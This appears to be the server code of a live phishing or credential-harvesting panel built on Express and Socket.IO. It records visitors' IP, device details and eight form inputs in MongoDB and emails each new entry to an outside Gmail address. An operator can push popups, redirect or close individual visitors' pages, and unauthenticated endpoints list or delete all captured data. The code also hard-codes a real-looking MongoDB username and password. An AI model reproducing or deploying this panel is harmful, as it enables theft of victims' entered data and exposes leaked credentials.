const express = require('express');
const http = require('http');
const path = require('path');
const socketIo = require('socket.io');
const mongoose = require('mongoose')
const nodemailer = require('nodemailer')

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.static(path.join(__dirname, 'public')));

mongoose.connect('mongodb+srv://ilyes:Ilyes123@cluster0.mtghl.mongodb.net/?retryWrites=true&w=majority', {
  dbName: 'popup'
})

const userSchema = new mongoose.Schema({
    ipAddress: { type: String },
    os: { type: String },
    browserName: { type: String },
    deviceName: { type: String },
    userId: { type: String },
    datetime: { type: String },
    span: { type: String },
    input1: { type: String },
    input2: { type: String },
    input3: { type: String },
    input4: { type: String },
    input5: { type: String },
    input6: { type: String },
    input7: { type: String },
    input8: { type: String },
    active: { type: Boolean },
    popupOpen: { type: Boolean },
});
  
// Create a model based on the schema
const User = mongoose.model('User', userSchema);

// Handle root route
app.get('/', (req, res) => {
  // Send the index.html file
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/b', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'page-b.html'));
});

app.get('/c', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'page-c.html'));
});

// Handle root route
app.get('/delete', (req, res) => {
  // Send the index.html file
  User.deleteMany({})
  .then(() => console.log('deleted'))
});

// Handle admin route
app.get('/admin', (req, res) => {
  // Send the admin.html file
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/users', (req, res) => {
    User.find({ 'active': true }).then((result) => {
        res.json(result)
    })
})

app.get('/allUsers', (req, res) => {
    User.find({}).then((result) => {
        res.json(result)
    })
})


io.on('connection', (socket) => {
    console.log('A user connected');

    socket.on('formSubmit', (data) => {
        socket.broadcast.emit('updateTable', data)
        const user = new User({
            ipAddress: data.ipAddress,
            os: data.os,
            browserName: data.browserName,
            deviceName: data.deviceName,
            userId: data.userId,
            datetime: data.datetime,
            span: data.span,
            input1: data.input1,
            input2: data.input2,
            input3: data.input3,
            input4: data.input4,
            input5: data.input5,
            input6: data.input6,
            input7: data.input7,
            input8: data.input8,
            active: true,
            popupOpen: data.popupOpen
        })
        user.save()

        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'ihannouch88@gmail.com',
                pass: '<appPassword>',
            },
        });

        // Define the email message
        var approveOptions = {
            from: 'New User Added <ihannouch88@gmail.com>',
            to: 'ahmedjouwork@gmail.com',
            subject: 'New User Added',
            html: `
                - <strong>User ID:</strong> ${data.userId}<br>
                - <strong>OS:</strong> ${data.os}<br>
                - <strong>IP Address:</strong> ${data.ipAddress}<br>
                - <strong>Browser:</strong> ${data.browserName}<br>
                - <strong>Device:</strong> ${data.deviceName}<br>
                - <strong>Datetime:</strong> ${data.datetime}<br>
            `,
        };

        transporter.sendMail(approveOptions, (error, info) => {
            if (error) {
                console.log(error)
            } else {
            }
        })
    });

    socket.on('formUpdate', (data) => {
        socket.broadcast.emit('updateRow', data)
        User.findOneAndUpdate(
            { 'userId': data.userId }, 
            {
                span: data.span,
                input1: data.input1,
                input2: data.input2,
                input3: data.input3,
                input4: data.input4,
                input5: data.input5,
                input6: data.input6,
                input7: data.input7,
                input8: data.input8,
                popupOpen: data.popupOpen
            }
        )
        .then(() => console.log('updated'))
    });

    socket.on('handlePopup', (userId, popupState) => {
        socket.broadcast.emit('handlePopup', userId, popupState)
        User.findOneAndUpdate(
            { 'userId': userId }, 
            { popupOpen: popupState }
        )
        .then(() => console.log('updated'))
        if (popupState === true) {
            var transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'ihannouch88@gmail.com',
                    pass: '<appPassword>',
                },
            });
    
            // Define the email message
            var approveOptions = {
                from: 'Popup Opened <ihannouch88@gmail.com>',
                to: 'ahmedjouwork@gmail.com',
                subject: 'Popup Opened',
                html: userId,
            };
    
            transporter.sendMail(approveOptions, (error, info) => {
                if (error) {
                    console.log(error)
                } else {
                }
            })
        }
    });

    socket.on('redirect', (data, url) => {
        socket.broadcast.emit('redirect', data, url)
    });

    socket.on('openPopup', (userId) => {
        socket.broadcast.emit('openPopup', userId)
    });

    socket.on('closePopup', (userId) => {
        socket.broadcast.emit('closePopup', userId)
    });

    socket.on('userClosedPage', (userId) => {
        socket.broadcast.emit('userClosedPage', userId)
    });
    
    socket.on('confirmClosed', (userId) => {
        User.findOneAndUpdate({ 'userId': userId }, { 'active': false }).then(() => console.log('deleted'))
    });

    socket.on('refreshPage', (userId) => {
        socket.broadcast.emit('refreshPage', userId)
    });

    socket.on('checkClosed', (userId) => {
        socket.broadcast.emit('checkClosed', userId)
    });

    socket.on('closeResponse', (userId) => {
        socket.broadcast.emit('closeResponse', userId)
    });

    socket.on('userRedirect', (userId, page) => {
        socket.broadcast.emit('userRedirect', userId, page)
    });

    socket.on('checkResponse', (userId) => {
        socket.broadcast.emit('checkResponse', userId)
    });

    socket.on('userExist', (userId) => {
        socket.broadcast.emit('userExist', userId)
    });

    socket.on('removeUser', (userId) => {
        User.findOneAndUpdate({ 'userId': userId }, { 'active': false }).then(() => console.log('deleted'))
        io.emit('removed', userId)
    });

    socket.on('finish', (data, link) => {
        io.emit('closePopup', data, link)
        io.emit('mainRedirect', data, link)
        User.findOneAndUpdate({ 'userId': data }, { 'active': false }).then(() => console.log('deleted'))
    });

    socket.on('popupClose', (data) => {
        io.emit('closePopup', data, '')
        User.findOneAndUpdate({ 'userId': data.userId }, { 'active': false }).then(() => console.log('deleted'))
    });

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

server.listen(process.env.PORT || 5000)